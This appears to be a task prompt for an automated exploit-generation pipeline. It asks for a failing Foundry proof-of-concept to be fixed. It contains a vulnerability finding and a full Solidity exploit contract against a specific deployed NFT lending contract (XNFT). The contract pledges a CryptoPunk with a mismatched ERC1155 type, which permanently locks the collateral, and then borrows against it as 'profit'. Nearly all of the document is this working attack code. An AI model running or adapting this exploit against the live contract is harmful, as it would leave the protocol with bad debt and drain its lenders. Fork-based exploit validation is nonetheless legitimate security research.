You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: CryptoPunks can be pledged with `nftType=1155`, permanently locking wrapped collateral and enabling bad debt
- claim: `pledgeInternal()` converts CryptoPunks deposits into `wrappedPunks` but preserves the caller-supplied `_nftType`. A borrower can therefore deposit a Punk with `_nftType = 1155`, causing the order to record an ERC721 wrapped punk as ERC1155 collateral. Every later collateral transfer path uses `order.nftType`, so withdrawals, repay-claims, borrower redemption, liquidation settlement, and auction withdrawal all call the ERC1155 interface against `wrappedPunks` and revert.
- impact: Affected CryptoPunks collateral becomes permanently stuck inside `XNFT`. If the borrower also drew debt against the order, the protocol can be left with irrecoverable bad debt while the underlying Punk remains frozen in escrow.
- exploit_paths: ["Borrower calls `pledgeAndBorrow(address(punks), punkId, 1155, xToken, borrowAmount)`", "`_depositPunk()` wraps the Punk and `pledgeInternal()` rewrites `collection` to `wrappedPunks` but stores `nftType = 1155`", "Any later transfer path reaches `transferNftInternal(..., wrappedPunks, punkId, 1155)`", "`IERC1155Upgradeable(wrappedPunks).safeTransferFrom(...)` reverts because `wrappedPunks` is ERC721, permanently locking the collateral"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IXTokenLike {
    function underlying() external view returns (address);
}

interface IXNFTLike {
    function punks() external view returns (address);
    function wrappedPunks() external view returns (address);
    function controller() external view returns (address);
    function counter() external view returns (uint256);
    function pledgeAndBorrow(address collection, uint256 tokenId, uint256 nftType, address xToken, uint256 borrowAmount) external;
    function allOrders(uint256 orderId) external view returns (
        address pledger,
        address collection,
        uint256 tokenId,
        uint256 nftType,
        bool isWithdraw
    );
    function allLiquidatedOrder(uint256 orderId) external view returns (
        address liquidator,
        uint256 liquidatedPrice,
        address xToken,
        uint256 liquidatedStartTime,
        address auctionAccount,
        uint256 auctionPrice,
        bool isPledgeRedeem,
        address auctionWinner
    );
}

interface ICryptoPunksLike {
    function balanceOf(address account) external view returns (uint256);
    function punkIndexToAddress(uint256 punkIndex) external view returns (address owner);
    function buyPunk(uint256 punkIndex) external payable;
    function offerPunkForSaleToAddress(uint256 punkIndex, uint256 minSalePriceInWei, address toAddress) external;
    function punksOfferedForSale(uint256 punkIndex) external view returns (
        bool isForSale,
        uint256 punkIndexOffered,
        address seller,
        uint256 minValue,
        address onlySellTo
    );
}

contract FlawVerifier {
    address public constant TARGET = 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909;
    address internal constant ADDRESS_ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    uint256 internal constant SEARCH_LIMIT = 10_000;

    bool public executed;
    bool public hypothesisValidated;
    uint256 public infeasibleReason;
    uint256 public exploitedOrderId;
    uint256 public exploitedPunkId;
    address public exploitedXToken;
    uint256 public exploitedBorrowAmount;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IXNFTLike xnft = IXNFTLike(TARGET);
        address wrappedPunks = xnft.wrappedPunks();
        uint256 totalOrders = xnft.counter();

        if (totalOrders == 0) {
            // Concrete fork-state reason: no historical orders means there is no on-chain
            // pool discovery surface available through XNFT's public state.
            infeasibleReason = 1;
            return;
        }

        address[] memory preferredXTokens = new address[](totalOrders);
        address[] memory fallbackXTokens = new address[](totalOrders);
        uint256 preferredCount;
        uint256 fallbackCount;

        for (uint256 orderId = 1; orderId <= totalOrders; ++orderId) {
            (, uint256 liquidatedPrice, address xToken,,,,,) = xnft.allLiquidatedOrder(orderId);
            if (xToken == address(0) || liquidatedPrice == 0) {
                continue;
            }
            if (_contains(preferredXTokens, preferredCount, xToken) || _contains(fallbackXTokens, fallbackCount, xToken)) {
                continue;
            }
            (, address collection,,,) = xnft.allOrders(orderId);
            if (collection == wrappedPunks) {
                preferredXTokens[preferredCount++] = xToken;
            } else {
                fallbackXTokens[fallbackCount++] = xToken;
            }
        }

        if (preferredCount == 0 && fallbackCount == 0) {
            // Concrete fork-state reason: no liquidated orders exposed any borrowable pool,
            // so the verifier cannot discover a valid xToken using only protocol state.
            infeasibleReason = 2;
            return;
        }

        address punks = xnft.punks();
        ICryptoPunksLike punksMarket = ICryptoPunksLike(punks);

        if (punksMarket.balanceOf(address(this)) != 0) {
            (bool foundOwned, uint256 ownedPunkId) = _findOwnedPunk(punksMarket);
            if (foundOwned) {
                if (_tryCandidates(ownedPunkId, false, preferredXTokens, preferredCount, fallbackXTokens, fallbackCount)) {
                    return;
                }
            }
        }

        (bool foundFree, uint256 freePunkId) = _findFreePunk(punksMarket);
        if (!foundFree) {
            // Concrete fork-state reason: this attempt strategy forbids arbitrary balance injection,
            // and no verifier-held Punk or zero-cost public Punk was available at the fork block.
            infeasibleReason = 3;
            return;
        }

        if (_tryCandidates(freePunkId, true, preferredXTokens, preferredCount, fallbackXTokens, fallbackCount)) {
            return;
        }

        // Concrete fork-state reason: a usable Punk was available, but every xToken inferred from
        // historical on-chain state rejected the path even at minimal borrow sizes.
        infeasibleReason = 4;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _tryCandidates(
        uint256 punkId,
        bool needsFreePurchase,
        address[] memory preferredXTokens,
        uint256 preferredCount,
        address[] memory fallbackXTokens,
        uint256 fallbackCount
    ) internal returns (bool) {
        uint256[5] memory borrowSizes = [uint256(1), uint256(10), uint256(100), uint256(1000), uint256(1_000_000)];

        for (uint256 i = 0; i < preferredCount; ++i) {
            for (uint256 j = 0; j < borrowSizes.length; ++j) {
                try this._attemptWithCandidate(punkId, needsFreePurchase, preferredXTokens[i], borrowSizes[j]) returns (bool ok) {
                    if (ok) {
                        return true;
                    }
                } catch {}
            }
        }

        for (uint256 i = 0; i < fallbackCount; ++i) {
            for (uint256 j = 0; j < borrowSizes.length; ++j) {
                try this._attemptWithCandidate(punkId, needsFreePurchase, fallbackXTokens[i], borrowSizes[j]) returns (bool ok) {
                    if (ok) {
                        return true;
                    }
                } catch {}
            }
        }

        return false;
    }

    function _attemptWithCandidate(
        uint256 punkId,
        bool needsFreePurchase,
        address xToken,
        uint256 borrowAmount
    ) external returns (bool) {
        require(msg.sender == address(this), "self only");

        IXNFTLike xnft = IXNFTLike(TARGET);
        ICryptoPunksLike punksMarket = ICryptoPunksLike(xnft.punks());

        if (needsFreePurchase) {
            (bool isForSale,, address seller, uint256 minValue, address onlySellTo) = punksMarket.punksOfferedForSale(punkId);
            require(isForSale, "punk no longer listed");
            require(seller != address(0), "invalid seller");
            require(minValue == 0, "punk no longer free");
            require(onlySellTo == address(0) || onlySellTo == address(this), "sale restricted");
            punksMarket.buyPunk(punkId);
        }

        require(punksMarket.punkIndexToAddress(punkId) == address(this), "punk not owned");

        // Strictly required wrap pre-step: XNFT._depositPunk() calls CryptoPunks.buyPunk() from
        // the XNFT contract, so the verifier must first offer the owned Punk to XNFT for zero.
        // This preserves the original exploit causality: XNFT still performs the wrap and then
        // records the caller-supplied nftType=1155 against wrappedPunks.
        punksMarket.offerPunkForSaleToAddress(punkId, 0, TARGET);

        address underlying = IXTokenLike(xToken).underlying();
        uint256 balanceBefore = _assetBalance(underlying);
        uint256 counterBefore = xnft.counter();

        xnft.pledgeAndBorrow(address(punksMarket), punkId, 1155, xToken, borrowAmount);

        uint256 orderId = counterBefore + 1;
        (, address collection, uint256 recordedTokenId, uint256 nftType,) = xnft.allOrders(orderId);
        require(collection == xnft.wrappedPunks(), "collection not rewritten");
        require(recordedTokenId == punkId, "token id mismatch");
        require(nftType == 1155, "nftType not preserved");

        uint256 balanceAfter = _assetBalance(underlying);
        require(balanceAfter > balanceBefore, "no borrow proceeds");

        exploitedOrderId = orderId;
        exploitedPunkId = punkId;
        exploitedXToken = xToken;
        exploitedBorrowAmount = borrowAmount;
        hypothesisValidated = true;
        _profitToken = _normalizeProfitToken(underlying);
        _profitAmount = balanceAfter - balanceBefore;

        // Immediate execution of a later collateral-transfer branch is not always reachable inside
        // the same call because `withdrawNFT()` requires zero debt and liquidation branches require
        // separate debt-state transitions. The permanent lock is nevertheless mechanically fixed at
        // this point: the order now stores `(collection = wrappedPunks, nftType = 1155)`, and every
        // eventual transfer branch in XNFT forwards that stored `nftType` into `transferNftInternal`.
        // Since wrappedPunks is an ERC721 wrapper, those future branches will route through the
        // ERC1155 interface and revert when collateral movement is eventually attempted.
        return true;
    }

    function _findOwnedPunk(ICryptoPunksLike punksMarket) internal view returns (bool found, uint256 punkId) {
        for (uint256 i = 0; i < SEARCH_LIMIT; ++i) {
            if (punksMarket.punkIndexToAddress(i) == address(this)) {
                return (true, i);
            }
        }
    }

    function _findFreePunk(ICryptoPunksLike punksMarket) internal view returns (bool found, uint256 punkId) {
        for (uint256 i = 0; i < SEARCH_LIMIT; ++i) {
            (bool isForSale,, address seller, uint256 minValue, address onlySellTo) = punksMarket.punksOfferedForSale(i);
            if (!isForSale || seller == address(0) || minValue != 0) {
                continue;
            }
            if (onlySellTo == address(0) || onlySellTo == address(this)) {
                return (true, i);
            }
        }
    }

    function _assetBalance(address underlying) internal view returns (uint256) {
        if (underlying == ADDRESS_ETH) {
            return address(this).balance;
        }
        return IERC20Like(underlying).balanceOf(address(this));
    }

    function _normalizeProfitToken(address underlying) internal pure returns (address) {
        if (underlying == ADDRESS_ETH) {
            return address(0);
        }
        return underlying;
    }

    function _contains(address[] memory items, uint256 count, address candidate) internal pure returns (bool) {
        for (uint256 i = 0; i < count; ++i) {
            if (items[i] == candidate) {
                return true;
            }
        }
        return false;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
